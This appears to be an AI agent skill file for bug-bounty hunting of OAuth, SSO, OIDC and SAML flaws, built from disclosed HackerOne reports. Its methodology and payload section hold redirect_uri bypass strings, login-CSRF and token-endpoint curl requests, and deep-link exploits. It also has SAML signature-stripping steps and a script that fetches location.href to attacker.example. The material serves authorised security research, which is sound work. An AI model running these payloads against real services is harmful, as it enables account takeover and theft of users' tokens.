---
name: hunt-oauth
description: Hunting skill for OAuth / SSO / OIDC vulnerabilities. Built from a comprehensive study pack of 109 FULL disclosed HackerOne report texts (140 assigned reports, 112 from TOP lists) plus the canonical hunt-oauth and hunt-saml domain references. Covers redirect_uri validation bypasses (prefix/suffix/homograph/path-traversal/parameter-pollution), missing/unbound state (login CSRF, account linking), nonce & code replay, email-verification/social-OAuth verification bypass to ATO, token leakage via Referer / postMessage / deep links / logcat, client_secret exposure in JS & APKs, implicit-grant and response_type abuse, OIDC dynamic registration, IdP-claim confusion (nOAuth, Pass-The-Token), client-side JWT SSO forgery, SAML XSW/replay/signature-stripping on SSO bridges, and OAuth-adjacent SSRF/XSS/open-redirect chains. Use when hunting any OAuth/SSO surface — authorize/token/callback endpoints, social login, mobile deep links, federated SSO connectors, or JWT-assertion SSO bridges. Exchange-the-code / demonstrate-the-ATO is mandatory before claiming Critical.
sources: hackerone_public, top_oauth_reports, portswigger_research, salt_labs, descope, detectify_labs, harel_research, binarysecurity_research, cve_database
report_count: 140
full_reports_read: 109
---

## Crown Jewel Targets

OAuth and SSO are the highest-value bug classes in web security because they sit directly on the authentication and authorization boundary. A single flaw converts into **account takeover, session theft, cross-tenant access, or authentication bypass** — the exact outcomes programs pay the most for. In the 109-report corpus, `sso-oauth` appears in 108 reports: it is the dominant signal, and it almost never travels alone (it co-occurs with `redirect-handling` in 63 reports, `api-endpoint` in 41, `filter-bypass` in 35, `csrf` in 17, `open-redirect` in 20, and `session-attack` in 21).

**Highest-value targets, in priority order:**

- **Consumer identity providers and their relying parties** — Google, Facebook, Microsoft, Apple, PayPal, Twitter/X SSO integrations. Any compromise cascades across every relying party that trusts the IdP token. The corpus is full of multi-hundred-million-user exposure (Grammarly/Vidio/Bukalapak "Pass-The-Token", ~1B accounts; Azure AD "nOAuth"; Expo `expo-auth-session` CVE-2023-28131).
- **Social-login callbacks on high-traffic SaaS** — `/auth/callback`, `/oauth/callback`, `/connect/authorize`, `/oauth/token`. Referer-leak and redirect_uri bugs here are repeatable ATO primitives (Rockstar Games alone has a cluster of FB-token-theft reports: #482743, #787160, #488269, #342709, #655288, #798121).
- **Multi-tenant SaaS and developer platforms** — GitLab, Shopify, Reddit, Basecamp/37signals, HackerOne. A verification-bypass or misconfiguration hits every tenant (Shopify #791775/#796956; GitLab #922456, #398799; Reddit #1212374, #1213765; Basecamp #850022, #3955956).
- **Mobile apps with custom deep-link OAuth handlers** — Android/iOS intent schemes, WebView wrappers, `push_notification_webview`, implicit flows. There is no centralized scheme registration, so custom schemes are routinely hijackable (#1700734 Shop App, #5314 Coinbase logcat leak, #110293 Periscope consumer key/secret embedded in app).
- **Enterprise SSO connectors and SAML-fronted OAuth issuers** — where an assertion-level bug becomes a token-level ATO. Zendesk JWT SSO (#638635, #734936), HackerOne (#888930, #171398), Rocket.Chat (#812064), Superhuman/Grammarly (#976603).
- **OIDC discovery/dynamic-registration surfaces** — any IdP exposing `.well-known/openid-configuration` with `registration_endpoint`; permissive registration lets an attacker register an arbitrary `redirect_uris` and mint tokens for a victim.

**Asset types that pay most:**

- OAuth authorization endpoints (`/oauth/authorize`, `/connect/authorize`, `/oauth2/authorize`, `/authorize`)
- Token exchange endpoints (`/oauth/token`, `/authorization/token`, `/access_token`)
- Callback handlers (`/auth/callback`, `/oauth/callback`, `/cb`, `/sso_continue`)
- Mobile deep-link handlers (custom scheme URIs, `intent://`, WebView `push_notification_webview`)
- OIDC metadata & registration (`.well-known/openid-configuration`, `/connect/register`)
- SAML ACS on SSO↔OAuth bridges (`/saml/acs`, `/users/saml/auth`, `/sso/saml/`)

**Typical payouts in the corpus:** $200 (pixiv #972601) to $10,500 (Superhuman #976603); account-takeover and auth-bypass findings routinely hit program max (Shopify SSO escalation = Critical; GitLab #922456 = $3,000; GitLab SSRF #398799 = $4,000; Periscope callback validation = Critical-class; Coinbase clickjacking = $5,000). A `response_type=code` swap + lax postMessage chain on Zoom paid $15,000. Severity is driven by whether you can show a **token/code reaching an attacker-controlled sink and a successful exchange** — not merely an open redirect.

### Severity Calibration (from the disclosed outcomes)

| Finding shape | Real outcome in corpus | Typical score |
|---|---|---|
| Open redirect leaks only `state`/`error`, no credential | Lichess #3099816 | Low (CVSS 3.6) |
| Open redirect via arbitrary `redirect_uri`, token not demonstrated | pixiv #972601 ($200) | Low |
| redirect_uri bypass with code/token delivered + exchange shown | GSA #665651 ($750), pixiv #1861974 ($2,000), Bohemia #405100 | High–Critical |
| Email-verification/social-OAuth bypass → ATO | GitLab #922456 ($3,000), Reddit #1212374 | High |
| CSRF on authorize endpoint → unauthorized API grant | Basecamp #850022 (CVSS 8.1) | High |
| Cross-IdP / audience confusion at scale | Pass-The-Token (~1B accounts), nOAuth, Expo CVE-2023-28131 (CVSS 9.6) | Critical |
| SAML XSW / client-side JWT SSO forgery → admin/internal access | Rocket.Chat #812064 (CVSS 8.8), Trint #638635 (CVSS 8.1) | High–Critical |
| OAuth-controller SSRF to internal services | GitLab #398799 ($4,000) | High (CVSS 7.5) |
| OAuth-adjacent reflected XSS | Mattermost #1216203 ($900), ORY Hydra #456333 (CVSS 4.6) | Medium–High |

**Why OAuth outranks a same-severity XSS:** a token is a portable, replayable credential. A reflected XSS ends when the tab closes; a stolen refresh token or a linked social identity persists across password resets and device changes. Several corpus findings explicitly note that the leaked token grants access to *other* services accepting the same IdP token (Rockstar/Facebook, Gratipay, Digits/Fabric).

---

## Attack Surface Signals

### URL Patterns to Hunt

```
/oauth/authorize
/oauth/token
/oauth/authorize?response_type=code
/oauth2/authorize
/oauth2/fallbacks/error
/connect/authorize
/connect/token
/connect/register
/authorize
/authorization
/authorization/token
/oauth/access_token
/auth/callback
/oauth/callback
/cb
/oauth/redirect
/oauth/create
/integrations/oauth/create
/jira/login/oauth/callback
/-/jira/login/oauth/access_token
/sso_continue
/users/saml/sign_in
/users/saml/auth
/saml/acs
/login?redirect_uri=
/login?redirect_to=
/signin?next=
/auth?return_to=
/push_notification_webview
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
```

### Parameters That Signal OAuth / SSO

```
client_id
client_secret
redirect_uri
redirect_url
callback_url
oauth_callback
oauth_token
oauth_verifier
response_type        # code | token | code id_token
response_mode        # query | fragment | form_post | web_message
scope
state
nonce
code
access_token
refresh_token
id_token
assertion
grant_type
code_challenge
code_challenge_method   # S256 | plain
prompt                 # none | consent | login
requestTokenAndRedirect
returnUrl
oauth_redirect_uri      # cookie-based (Greenhouse #315205)
```

### Response Headers That Signal OAuth

```
Location: https://accounts.example.com/oauth/...?code=...&state=...
Location: ...#access_token=...&token_type=bearer   (implicit flow — fragment)
Set-Cookie: oauth_state=...
Set-Cookie: oauth_redirect_uri=...
WWW-Authenticate: Bearer
Content-Type: application/json  (body contains access_token / id_token)
Crossdomain.xml allow-access-from domain="*"  (cross-site-flashing path, Vimeo #136582)
```

### JavaScript / Bundle Patterns (grep these)

```javascript
redirect_uri
redirectUrl
returnUrl
client_id
client_secret            // leaked secret in JS bundle or sourcemap
response_type=code
response_type=token
response_mode=web_message
oauth_token
access_token
id_token
state=
nonce=
postMessage(             // promiscuous origin checks — Zoom, Detectify "Dirty Dancing"
window.location.hash
window.location.href
push_notification_webview
deeplink
intent://
jwt.sign(                // client-side JWT SSO (Trint #638635)
```

### Tech Stack Signals

- `.well-known/openid-configuration` present = full OIDC surface (authorization, token, JWKS, possibly `registration_endpoint`)
- Doorkeeper, OmniAuth, Devise (Ruby), Passport.js (Node), Spring Security OAuth (Java), ORY Hydra/Fosite (Go — #456333 is an ORY Hydra error endpoint)
- Social login buttons (Google, Facebook, Apple, Microsoft, Twitter/X, VK, Odnoklassniki, Mail.Ru, Yandex) = OAuth surface guaranteed
- Android `intent-filter` in `AndroidManifest.xml` handling `http://` or custom scheme URIs; apps logging OAuth codes via `logcat`
- SAML IdP metadata / ADFS endpoints / Shibboleth = SSO surface; check whether SAML assertion validation mints OAuth tokens downstream
- Error endpoints that reflect `error`, `error_description`, `error_hint` (#456333) or `redirect_to` (#1216203) — XSS adjacent to the token flow

---

## Discovery Patterns From 109 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **The authorization request itself.** Start by initiating a real login flow and capturing the full `/oauth/authorize` request. What to look for: `client_id`, `redirect_uri`, `response_type`, `state`, `nonce`, `scope`, `response_mode`. Half of all findings begin with a researcher noticing a missing or weak value here — #2688 ("State parameter i.e anti-csrf token to prevent session hijacking attacks is missing on Google OAuth"), #215381 (no CSRF token or Origin validation on authorize POST).

2. **The callback / redirect chain.** Follow the `Location` header after "Authorize." What to look for: does `code`/`access_token` land on a host you control? Does the callback page load third-party resources (images, scripts, analytics) that will carry the full URL in `Referer`? #140432 (referer sends token to my profile → example.com), #482743 ("injecting an `<img>` tag containing a payload pointing to the attacker's own domain into replies").

3. **Social-login account-linking and verification gates.** What to look for: can you create an unverified account with the victim's email and then complete a social OAuth flow to "verify" it? The single most repeated ATO pattern in the corpus. #922456 ("limitation that requires a validated email before going through the OAuth flow, however this is bypassable"), #1212374 ("login using the same Gmail account ... bypasses the verification methods"), #1074047 ("weak auth verification which does not check if a previous account was created with the same email").

4. **Public source, sourcemaps, and mobile APKs** (`public-code-search` 18, `js-source-review` 9). What to look for: hard-coded `client_secret`, JWT signing secrets, obfuscated consumer key/secret pairs, callback-locking logic. #638635 found `REACT_APP_ZENDESK_SECRET` in `app.e984c9df.js.map` and generated the Zendesk JWT client-side; #110293 recovered Periscope's Twitter consumer key/secret by reverse engineering; #1994324 found OAuth2 client_secret stored plaintext in Nextcloud DB.

5. **The error/fallback endpoints adjacent to OAuth.** What to look for: reflected parameters, debug pages, verbose exceptions. #456333 (`/oauth2/fallbacks/error?error=xss&error_description=...` reflected XSS), #315205 (`show_exceptions` on `oauth-redirector.services.greenhouse.io` leaked config/env/source via an invalid `oauth_redirect_uri` cookie), #143240 (`authorize_url` from `/core/oauth/auth` unescaped into a template → XSS).

6. **OIDC metadata and registration.** What to look for: `registration_endpoint`, `response_types_supported` including `token`/`id_token token` (implicit), missing PKCE requirements. Open registration = register a client with `redirect_uris:["https://attacker/cb"]`.

7. **Deep links and mobile WebViews.** What to look for: custom schemes that accept arbitrary `url`, implicit-flow codes in fragment, codes written to logs. #1700734 ("Deep links are NOT secure and you should never send any sensitive information in them"), #5314 (`adb logcat -s Coinbase` reads the OAuth response code).

8. **Subdomains and dangling assets** (`subdomain-takeover` 15, `subdomain` 7). What to look for: any `*.target.com` accepted as a valid redirect URI plus a deprovisioned subdomain you can claim. #110293 and #131202 ("the forumla of a valid redirect_uri for twitter app is http(s?)://*.twitter.com/*") show how wildcard subdomain trust is exploited with an open redirect on a legit subdomain.

9. **Post-auth pages that can be reloaded or framed** (`session-attack` 21, `clickjacking` 2). What to look for: `postMessage` listeners that check only `*.target.com`, "hold space"/double-click overlays on the authorize button, fragment readers. #3287060 (WakaTime double-clickjacking), the Zoom chain (`response_mode=web_message` + permissive `*.zoom.us` origin check).

10. **Host-header / URL-fetching behavior inside OAuth controllers** (`blind-oob` 20, `url-fetching` 7, `server-side-rendering` 19). What to look for: OAuth controllers that issue outbound requests using attacker-controlled `Host` or token endpoints (GitLab #398799 blind SSRF via `Host: 162.243.147.21:81` on `/-/jira/login/oauth/access_token`).

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Counts are the number of full reports in which the signal appears (out of 109).

| Rank | Signal (count) | Why it matters | What to probe |
|---|---|---|---|
| 1 | `sso-oauth` (108) | The core surface — every entry point is a potential ATO | Map authorize, token, callback, and linking flows for every IdP |
| 2 | `redirect-handling` (63) | redirect_uri is the #1 token-theft sink | Prefix/suffix match, traversal, pollution, open redirect on whitelisted host |
| 3 | `api-endpoint` (41) | Token endpoints & APIs are where grants become access | Direct `/oauth/token` POSTs, unverified accounts, audience confusion |
| 4 | `filter-bypass` (35) | Validators are routinely defeated by encoding/parser confusion | Unicode/punycode, double-encoding, `%2523`, `//`, null bytes |
| 5 | `search-filter-sort` (27) | Reflective surfaces used to smuggle tokens (img src, comments) | Inject `<img>`/markdown with external `src` on post-auth pages |
| 6 | `xml-parser` (21) | SAML assertions / SVG logos are XML — XXE & XSW live here | SVG app logos, SAML response manipulation, DOCTYPE entities |
| 7 | `session-attack` (21) | Login CSRF, session fixation, replay | Fixed `state`, replay codes/assertions, forced login |
| 8 | `blind-oob` (20) | SSRF & callback exfil channels in OAuth controllers | Collaborator in token endpoint `Host`/URL fields |
| 9 | `open-redirect` (20) | The bridge from a whitelist pass to token delivery | Invalid scope → redirect, `next`/`redirect_to` params, POST redirects |
| 10 | `server-side-rendering` (19) | Callback pages & screenshotters render attacker content | Reflective XSS, token-bearing fragments, image injection |
| 11 | `public-code-search` (18) | Secrets & logic leak in source/sourcemaps/APKs | grep `client_secret`, `jwt.sign`, `consumer_secret`, sourcemaps |
| 12 | `csrf` (17) | Missing state = authorize/login/link CSRF | Remove state; POST authorize with victim cookie, no Origin |
| 13 | `comment-injection` (17) | XML/text extraction disagreements (SAML NameID) & markup smuggling | `<!-- -->` in NameID, comment-wrapped callback content |
| 14 | `cookie-handling` (16) | oauth_state / oauth_redirect_uri cookies drive redirects | Tamper cookie values, force debug exceptions (#315205) |
| 15 | `admin-internal` (16) | OAuth bridges to admin/Zendesk/internal apps | Register `*@company.com`, read internal tickets (#734936) |
| 16 | `subdomain-takeover` (15) | Wildcard redirect trust + claimable subdomains | Find `*.target.com` whitelist + dangling DNS/old app |
| 17 | `image-processing` (11) | Image/SVG import tools become token exfil channels | Upload SVG with script; import-from-URL to steal fragment (#265943) |
| 18 | `misconfiguration` (10) | Social OAuth link to already-registered email | Signup with OAuth over existing victim email (#1212374) |
| 19 | `auth-bypass` (10) | Sequence/policy checks skipped server-side | Direct token endpoint, skip email verification, waitlist bypass (#64946) |
| 20 | `js-source-review` (9) | Client-side JWT signing & permissive postMessage | Sourcemaps, `jwt.sign`, `postMessage` origin checks |
| 21 | `cache-layer` (8) | Cached callback pages persist tokens | Re-fetch callback HTML/redirects after a victim flow |
| 22 | `subdomain` (7) / `url-fetching` (7) / `path-traversal-lfi` (7) / `stored` (7) / `proxy-feature` (7) | Secondary amplifiers | Subdomain whitelist, SSRF via fetch, `../` in redirect_uri, stored img src |
| 23 | `jwt-token` (5) | Client-side/mutable JWT claims | Forge SSO JWT with leaked secret; unstable `sub`/`email` claims |
| 24 | `dos-resource` (4) / `debug-error-leak` (4) / `cloud-metadata` (4) | Escalation & recon side-channels | SSO DoS (#976603), debug pages, IMDS via OAuth SSRF |
| 25 | `svg-upload` (3) / `reflected` (3) / `json-body` (3) | Specific injection carriers | SVG-as-JPG XXE (#104620), reflected error params, JSON-body flows |
| 26 | `double-encoding` (2) / `clickjacking` (2) / `race-condition` (2) / `cors-misconfig` (2) / `graphql` (2) | Precision bypasses | `%2523`→`#` (#131202), double-click, TOCTOU, wildcard CORS, GraphQL token queries (#734936) |
| 27 | `brute-otp-reset` (2) / `request-smuggling` (2) / `template-injection` (2) | Rare but high-impact | OTP flows adjacent to login, smuggling in redirect, template eval |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

These are verbatim "how I found it" fragments from the disclosed reports — study-pack section 3.

1. `[#791775]` "I found a way to confirm arbitrary emails, and after confirming arbitrary email in *."
2. `[#110293]` "the leakage of the key and secret pair is *not* a major security concern as Twitter provides the 'Callback Locking' protection to prevent the *callback_url* to be overwritten during the Request Token phase."
3. `[#265943]` "I observed you are using Google Cloud Storage, so blocking `svg` images or disallowing any uploads of `svg-xss` images will further enhance security."
4. `[#1074047]` "While testing badoo i have noticed that users can use SMAL (Google,MSN,VKontakte,Odnoklassniki,Yandex ..."
5. `[#3099816]` "By manipulating the redirect_uri parameter during the OAuth authorization process with Lichess, an attacker can redirect users to an arbitrary external domain (e."
6. `[#1216203]` "The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow."
7. `[#405100]` "During the OAUTH flow, the redirect_uri on https://accounts."
8. `[#850022]` "I found a CSRF in the OAuth2 authorization endpoint on launchpad."
9. `[#850022]` "I found that when making a post request to ``` authorization ``` endpoint it does not check the 'authenticity token' if you add ' .json or .xml '."
10. `[#972601]` "Hello @pixiv security team, i hope you are well, i noticed you can redirect users to another domain if you send an invalided scope."
11. `[#178345]` "I found a bypass of that patch."
12. `[#3930]` "I found a new and more dangerous way to steal phabricator facebooks oauth tokens,codes,"
13. `[#3596]` "I found that an attacker is able to steal access_tokens of facebook users via Phabricator App (184510521580034)."
14. `[#44492]` "I found the oauth token getting leaked via login with twitter integration on Fabric."
15. `[#405697]` "@dr_dragon found a bug in our partners application that resulted in an open redirect."
16. `[#292783]` "I discovered an little Oauth flow in the comments widget authentication process using redirect_uri manipulations."
17. `[#2676025]` "During my testing, the restriction on `/oauth/token` is being voided once the victim authenticates and completes the email verification regardless of the IP difference between the attacker and the victim."
18. `[#2575]` "I've found a way to circumvent redirect_uri restrictions imposed by the web application using domain-suffix/subdomain technique."

### Probe Checklist (15 concrete probes)

1. **Baseline the flow** — capture a complete authorize→callback exchange with Burp; record `client_id`, `redirect_uri`, `response_type`, `state`, `nonce`, `scope`, `response_mode`.
2. **State removal test** — drop `state` entirely from the authorize request; does the flow still complete at the callback? (#2688, #159507)
3. **Fixed/replayed state** — reuse one `state` across two browser sessions; check whether it is bound to the session or merely present (#2228 login CSRF).
4. **redirect_uri exact-match fuzz** — try `legit.com.evil.com`, `legit.com@evil.com`, `evil.com#legit.com`, `legit.com/../../evil`, `legit.com%2F@evil.com`, and IDN homographs (`šemrush.com`) (#861940, #405100, #1861974).
5. **Parameter pollution** — send `redirect_uri=A&redirect_uri=B`; check which value the server validates vs. which it uses (#131202).
6. **Open-redirect bridge** — find any open redirect on the whitelisted domain (`/logout?next=`, profile pages, invalid-scope redirect) and set it as `redirect_uri` (#55525, #972601, #140432).
7. **response_type swap** — change `code`→`token`; check whether the endpoint validates only `code` and now emits a token in the fragment (#665651, Detectify Dirty Dancing).
8. **response_mode=web_message** — add it and observe `postMessage`; test permissive origin checks in the receiving listener (Zoom chain).
9. **Email-verification bypass to ATO** — register unverified account with victim's email, then complete social OAuth; check whether you land logged in as the victim (#922456, #1212374, #1074047).
10. **Direct token endpoint POST** — call `/oauth/token` with an unverified account or a captured code; check for skipped sequence/policy checks (#2676025, #922456).
11. **Referer leak hunt** — after callback, enumerate all outbound subrequests (img, script, iframe, analytics, language switcher, social share); check `Referer` for `code`/`access_token` (#482743, #140432, #787160).
12. **postMessage / hash reader audit** — grep callback JS for `postMessage`, `window.location.hash`, `window.opener`; test cross-origin reads (#875938, Zoom).
13. **Secret exposure sweep** — grep JS bundles, sourcemaps, APK resources, and public repos for `client_secret`, `consumer_secret`, `jwt.sign`, `XOAUTH2` passwords (#638635, #110293, #1806275, #1994324).
14. **Mobile/deep-link probe** — craft `intent://` and custom-scheme URLs pointing the WebView at an attacker URL; check `logcat` for leaked codes (#1700734, #5314).
15. **OIDC/SSO bridge check** — fetch `.well-known/openid-configuration`; if `registration_endpoint` is open, register a client with attacker `redirect_uris`; if SAML is in front, replay/modify the assertion and see whether an OAuth token is issued (#888930, #812064, #638635).

---

## Step-by-Step Hunting Methodology

1. **Inventory every OAuth/SSO entry point.**
   - Spider for `/oauth`, `/connect`, `/auth`, `/authorize`, `/callback`, `/sso`, `/saml`, `/login`.
   - Fetch `/.well-known/openid-configuration` and `/.well-known/oauth-authorization-server`; note `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `registration_endpoint`, `response_types_supported`, `grant_types_supported`.
   - Decompile mobile apps (`apktool d app.apk`) and grep for `redirect_uri`, `intent://`, custom schemes, `consumer_secret`, `client_secret`.
   - Search public code (GitHub) for the target's `client_id`/secret — `public-code-search` appears in 18 reports.

2. **Map the full flow end to end.**
   - Capture the authorization request; note every parameter and which are attacker-influenceable.
   - Follow the callback: where do code/token land? What validates `state`/`nonce`? Is PKCE used (`code_challenge`, `code_challenge_method=S256`)?
   - Identify the grant type: authorization code, implicit (`response_type=token`), client credentials, password, or legacy `type=user_agent` (Basecamp #3955956 — deprecated implicit grant delivering victim-bound tokens to a registered redirect).

3. **Attack `redirect_uri` first (highest yield: 63 reports).**
   - Exact-match bypass shapes: subdomain extension, userinfo trick, path traversal, encoded slashes, fragment injection, IDN homograph, parameter pollution.
   - **Confirm both gates** (see browser-vs-server rule in Bypass Techniques): the server validator must pass AND the browser must navigate to the attacker host. Headless-test the final URL.
   - If exact-match is enforced, find an open redirect on the whitelisted domain and chain it (#131202, #405697, #1129761).

4. **Attack `state` / CSRF (17 reports).**
   - Remove `state`; use a fixed value; check for session binding.
   - For authorize-endpoint CSRF, POST with victim cookie and no CSRF token / no Origin check — try `.json`/`.xml` suffix variants that skip authenticity-token checks (#850022, #215381, #136582).
   - Test login CSRF / forced authorization (LinkedIn #2649615 "Forced OAuth authorization using button ID in hash and holding space"); chain with double-clickjacking (#3287060).

5. **Attack verification & account-linking logic (the most repeated ATO pattern).**
   - Create an unverified account using the victim's email; complete social OAuth; check whether you inherit the victim's linked identity (#922456, #1212374, #1074047, #1815463, #729960).
   - Bypass registration/waitlist gating via OAuth (#64946).
   - Test direct token endpoint access after partial auth (#2676025).

6. **Hunt token leakage channels.**
   - Referer leakage: inject `<img src=attacker>` or markdown into pages the victim views after OAuth; harvest `code`/`access_token` from the Referer header (#482743, #342709, #787160, #140432).
   - Screenshot/image import features: upload SVG with script, or use "import from site" to read the fragment (#265943, #488269, #655288).
   - postMessage / fragment readers on callback pages (Zoom, Detectify Dirty Dancing, #875938).
   - Mobile log leakage (`logcat`) and insecure transport (http rather than https — Bumble #703759, Twitter iOS #168538).

7. **Exploit IdP claim confusion & audience failures.**
   - Pass-The-Token: replay a token issued for your own app at the victim RP's login API; check for missing `aud`/`app_id` validation (Grammarly/Vidio/Bukalapak, Picsart #739321).
   - nOAuth: set a mutable/unverified `email` claim at the IdP to the victim's address; log in to an RP that keys on email (Azure AD).
   - Cross-IdP `sub` collision: same `sub` from two IdPs mapped to the same account.
   - Scope confusion: read DMs without permission by manipulating `scope`/permission display (#434763); a low-scope token that can change account name (#1031240).

8. **Test OIDC registration & implicit grants.**
   - If `registration_endpoint` is open, register a client with `redirect_uris:["https://attacker/cb"]` — this is the cleanest token-theft primitive.
   - If `response_types_supported` includes `token` or `id_token token`, test `response_type` swap and implicit delivery to attacker redirect.
   - Check PKCE enforcement: omit `code_challenge`; if tokens still issue, PKCE is optional.

9. **Probe OAuth-adjacent SSRF / XSS / open redirect.**
   - Blind SSRF via `Host` header on OAuth token controllers (#398799).
   - Reflected XSS on error/fallback endpoints and unescaped `redirect_to`/`authorize_url` (#456333, #1216203, #143240, #87040).
   - Debug info disclosure via malformed OAuth cookies (#315205).

10. **Bridge SAML→OAuth when SSO is layered.**
    - Replay a captured SAML response (#888930).
    - XSW / signature-stripping: modify assertion while keeping/removing signature; check whether the first `Signature`/first `Response` element is used (Rocket.Chat #812064).
    - Client-side JWT SSO forgery using a leaked signing secret (#638635, #734936).
    - SSO misconfiguration/binding flaws that let you SSO into the attacker's org (#976603).

11. **Establish impact & run Gate 0.** Demonstrate the full chain to a token/code reaching an attacker-controlled sink and, where applicable, exchange it for a session. Only then score severity.

12. **Document with screenshots at every hop** and cite real IDs/line references in the report.

### Flow-Mapping Quick Reference (fill this in before attacking)

```
IdP / AS endpoint:        ______________________________________
client_id:                ______________   client_secret (if any): __________
redirect_uri (registered):______________________________________
response_type allowed:    code / token / id_token / code id_token
response_mode:            query / fragment / form_post / web_message
grant_type allowed:       authorization_code / implicit / password / client_credentials
PKCE:                     enforced / optional / absent     code_challenge_method: ______
state:                    present / absent / session-bound / fixed-accepted
nonce:                    present / absent / validated after exchange: Y/N
Email verification gate:  before grant / after grant / unenforced at token endpoint
Open registration:        Y / N        registration_endpoint: ______________
SAML in front:            Y / N        ACS: ______________________________
Token lands at:           ______________________________________
Second factor / consent:  ______________________________________
```

If any of the last four rows is "absent / unenforced / Y", prioritize that row: corpus findings cluster heavily around missing state, unenforced PKCE, open registration, and unenforced verification gates.

---

## Payload & Detection Patterns

### redirect_uri Bypass Payloads

```
# Host confusion / subdomain extension
https://legit.com.evil.com/cb
https://evil.com#legit.com
https://legit.com@evil.com/cb
https://legit.com%2F@evil.com/cb
https://legit.com%252F..%252Fevil.com/cb

# Path traversal (server normalizes after validation)
https://legit.com/oauth/callback/../../../evil/cb
https://legit.com/cb/../../attacker/cb

# IDN homograph / punycode (Semrush #861940)
https://oauth.šemrush.com/oauth2/success
https://oauth.xn--emrush-9jb.com/oauth2/success         # sémrush / šemrush variants

# Prefix-match bypass (Bohemia #405100 — startswith, no end anchor)
https://xbox.dayz.comtest.com/api/auth/callback

# Wildcard subdomain trust + open redirect (Twitter #131202)
https://cards.twitter.com/cards/18ce53.../yyms%2523      # %2523→%23→# fragment to steal token

# Parameter pollution
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# Fragment injection with valid scope (GSA #665651, response_type=token)
/oauth/authorize?client_id=X&response_type=token&redirect_uri=https://evil.com/auth/callback&state=X
```

### State CSRF / Login CSRF Test

```bash
# Step 1: capture state from a valid authorize request
GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=XYZ

# Step 2: drop the request; force victim to visit callback with attacker's code + fixed state
GET /oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
# If victim is now logged in as attacker → login CSRF (#2228, #159507)

# Authorize-endpoint CSRF: POST with victim cookie, no CSRF token, no Origin (#215381, #850022)
curl -X POST https://target.com/oauthAuthorize \
  -b 'sid=VICTIM_SESSION' \
  -d 'client_id=APP&redirect_uri=https://attacker/cb'
# Try endpoint suffixes that bypass authenticity-token checks:
#   /authorization.json, /authorization.xml
```

### Email-Verification Bypass to ATO

```bash
# 1) Create account on target with victim@email.com — DO NOT verify
# 2) In another browser, seed victim account on the IdP side with same email
# 3) Complete "Sign in with <IdP>" on target using the unverified account
# 4) Observe you are logged in as the victim / linked to their identity
# Refs: #922456 (GitLab), #1212374 (Reddit), #1074047 (Bumble), #2676025
```

### Referer Leakage / Token Smuggling

```html
<!-- Post-auth page where the victim lands with code/token in URL -->
<img src="https://attacker.example/collect?from=referer">
<script>fetch('https://attacker.example/?u='+encodeURIComponent(location.href));</script>
<!-- Inject into comments/replies/support threads (#482743, #787160);
     or into SVG imported via "import from site" (#265943, #342709) -->
```

```bash
# Verify outbound requests on callback page carry the full URL in Referer
grep -rE "fetch|XMLHttpRequest|img.src|script.src|analytics|share" callback_page.html
# Language switchers, social-share buttons, analytics, CDN images are classic carriers
# (Rockstar pattern: language change / crew page / support thread)
```

### postMessage / Fragment Reader Abuse

```javascript
// Attacker page opening the OAuth flow (Zoom / Detectify "Dirty Dancing")
var w = window.open('https://idp/authorize?client_id=APP&response_type=code' +
                    '&response_mode=web_message&redirect_uri=https://app/cb&state=S');
window.addEventListener('message', function(e){
  // If listener only checks e.origin.endsWith('zoom.us') → any *.zoom.us passes
  if (e.origin.endsWith('target.com')) { sendToAttacker(e.data); }
});
```

### Mobile Deep Link Exploit (Android)

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"

# Web-borne variant
<a href="intent://push_notification_webview?url=https://evil.com/#Intent;scheme=target-app;package=com.target.app;end">Click</a>

# Log leakage — any app on the device can read the OAuth code
adb logcat -s Coinbase     # #5314
```

### Token Endpoint Auth Bypass / Audience Confusion

```bash
# Direct token endpoint with unverified credentials (#922456, #2676025)
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" -d "redirect_uri=https://legit.com/callback"

# Pass-The-Token: replay token minted for attacker's app at victim RP
curl https://victim-rp.com/api/login -H "Authorization: Bearer $TOKEN_FROM_ATTACKER_APP"
# If RP calls /me but never validates app_id/aud → ATO
```

### OIDC Discovery & Dynamic Registration Abuse

```bash
curl -s https://idp/.well-known/openid-configuration | \
  jq '{authorization_endpoint,token_endpoint,jwks_uri,registration_endpoint,response_types_supported}'

# If registration_endpoint is open:
curl -X POST https://idp/connect/register -H 'Content-Type: application/json' \
  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
```

### SAML→OAuth Bridge Payloads

```bash
# Replay captured SAML response (#888930): resubmit the POST to /users/saml/auth unchanged.
# Signature stripping / XSW (#812064): decode, edit, re-encode
echo "BASE64_SAML" | base64 -d > saml.xml
# remove <ds:Signature> or relocate signed assertion, set NameID to admin
base64 -w0 saml.xml   # POST binding = raw base64, no compression

# Comment injection in NameID
<NameID>admin@company.com<!--evil-->@attacker.com</NameID>
```

### Grep Patterns for Recon

```bash
# In JS bundles / sourcemaps / APK files
grep -rE "redirect_uri|client_secret|consumer_secret|oauth_token|access_token|jwt.sign|push_notification" .
grep -rE "intent://|deeplink|scheme://|postMessage|window.location.hash" .

# In Burp history — filter:
#   URL contains "oauth" OR "token" OR "callback" OR "authorize"
#   Response contains "access_token" OR "code=" in Location header
```

### Browser-parse vs server-parse — redirect_uri prefix-match bypass shapes

A server-side prefix-match flaw is **necessary but not sufficient** to land the code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another (WHATWG URL parser, used by all modern browsers since 2018, parses userinfo `@` only before the first `/` after `://`). Always confirm both.

| Server validator | Attack URL | Server startswith | Browser host | Exploit? |
|---|---|---|---|---|
| prefix `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com | **YES** |
| prefix `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | acme.example | **NO** |
| prefix `https://acme.example` (substring) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com | **YES** |
